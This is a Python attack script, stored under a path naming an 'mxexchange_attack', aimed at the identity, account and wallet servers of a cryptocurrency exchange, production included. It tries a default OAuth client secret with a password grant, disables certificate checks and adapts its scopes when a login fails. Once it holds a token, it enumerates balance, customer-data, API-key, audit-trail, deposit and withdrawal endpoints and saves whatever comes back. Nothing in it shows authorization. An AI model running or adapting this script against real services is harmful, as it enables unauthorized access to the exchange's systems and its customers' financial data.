import requests, json, sys, urllib3
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20

def safe(t, n=500):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

EMAIL = "testuser@gmail.com"
PASS = "TestPass123!@#"
CLIENT_ID = "spa"
CLIENT_SECRET = "secret"

results = {}

print("=" * 70)
print(f"MX EXCHANGE — LOGIN WITH client_id=spa")
print("=" * 70)

# Try both HK Dev and PROD identity servers
for env, base_id, base_acct in [
    ("HK_DEV", "https://identityhkdev.mx.exchange", "https://accounthkdev.mx.exchange"),
    ("PROD", "https://identity.mx.exchange", "https://account.mx.exchange"),
]:
    print(f"\n{'='*50}")
    print(f"  {env}")
    print(f"{'='*50}")
    
    # Standard password grant
    print(f"\n[LOGIN] password grant...")
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "password",
        "username": EMAIL,
        "password": PASS,
        "scope": "openid profile email accountApi walletApi orderBookApi brokerApi notificationApi commonApi offline_access",
    }
    r = requests.post(f"{base_id}/connect/token", data=data,
                     headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
                     timeout=T, verify=False)
    print(f"  => {r.status_code} ({len(r.text)}b)")
    print(f"  {safe(r.text, 500)}")
    
    if r.status_code == 200:
        token_data = r.json()
        results[f"{env}_token"] = token_data
        access_token = token_data.get("access_token", "")
        print(f"\n  [!!!] GOT TOKEN! ({len(access_token)} chars)")
        print(f"  token_type: {token_data.get('token_type')}")
        print(f"  expires_in: {token_data.get('expires_in')}")
        print(f"  scope: {token_data.get('scope')}")
        
        # Now use the token to get balances
        AUTH = {"Authorization": f"Bearer {access_token}", "Accept": "application/json", "User-Agent": "Mozilla/5.0"}
        
        print(f"\n[BALANCE] Using token...")
        balance_endpoints = [
            ("GET", f"{base_acct}/api/Users/Balance/1"),
            ("GET", f"{base_acct}/api/Users/Balance/2"),
            ("GET", f"{base_acct}/api/Users/Balance/3"),
            ("GET", f"{base_acct}/api/Users/UserInfo"),
            ("GET", f"{base_acct}/api/Users/UserInfoDetails"),
            ("GET", f"{base_acct}/api/Users"),
            ("GET", f"{base_acct}/api/Users/GetCustomerData"),
            ("GET", f"{base_acct}/api/Users/GetCustomerAccountData"),
            ("GET", f"{base_acct}/api/Account/1/Profile"),
            ("GET", f"{base_acct}/api/Account/2/Profile"),
            ("GET", f"{base_acct}/api/Account/GetOpenApiKey"),
            ("GET", f"{base_acct}/api/Banks/AllBank"),
            ("GET", f"{base_acct}/api/MasterData"),
            ("GET", f"{base_acct}/api/AuditTrail"),
            ("GET", f"{base_acct}/api/Groups"),
        ]
        
        for method, url in balance_endpoints:
            try:
                r2 = requests.get(url, headers=AUTH, timeout=T, verify=False)
                path = url.split(".exchange")[1] if ".exchange" in url else url
                tag = "[!!!]" if r2.status_code == 200 and len(r2.text) > 2 else f"[{r2.status_code}]"
                print(f"  {tag} {path} => {r2.status_code} ({len(r2.text)}b) {safe(r2.text, 300)}")
                if r2.status_code == 200 and r2.text:
                    results[f"{env}_{path}"] = r2.text[:5000]
            except Exception as e:
                print(f"  [E] {url} => {e}")
        
        # Try wallet service
        WALLET_BASES = {
            "HK_DEV": "https://wallethkdev.mx.exchange",
            "PROD": "https://wallet.mx.exchange",
        }
        wallet_base = WALLET_BASES.get(env, "")
        if wallet_base:
            print(f"\n[WALLET] {wallet_base}...")
            wallet_eps = [
                "/api/Wallet", "/api/Wallet/1", "/api/Wallet/2",
                "/api/Currency", "/api/Currency/1",
                "/api/Address", "/api/Deposit", "/api/Withdrawal",
                "/api/Transfer", "/api/FiatWithdrawal", "/api/FiatDeposit",
            ]
            for path in wallet_eps:
                try:
                    r2 = requests.get(f"{wallet_base}{path}", headers=AUTH, timeout=T, verify=False)
                    tag = "[!!!]" if r2.status_code == 200 and len(r2.text) > 2 else f"[{r2.status_code}]"
                    print(f"  {tag} {path} => {r2.status_code} ({len(r2.text)}b) {safe(r2.text, 300)}")
                    if r2.status_code == 200 and r2.text:
                        results[f"{env}_wallet_{path}"] = r2.text[:5000]
                except Exception as e:
                    print(f"  [E] {path} => {e}")

    else:
        # Try with fewer scopes
        print(f"\n  Trying fewer scopes...")
        for scope in ["openid", "openid profile", "openid accountApi", ""]:
            data["scope"] = scope
            r = requests.post(f"{base_id}/connect/token", data=data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=T, verify=False)
            if r.status_code != 400 or "invalid_client" not in r.text:
                print(f"  scope='{scope}' => {r.status_code} {safe(r.text, 300)}")
            if r.status_code == 200:
                break

# Save everything
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\login_results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True)

print(f"\n{'='*70}")
print(f"Results: {len(results)} items saved")
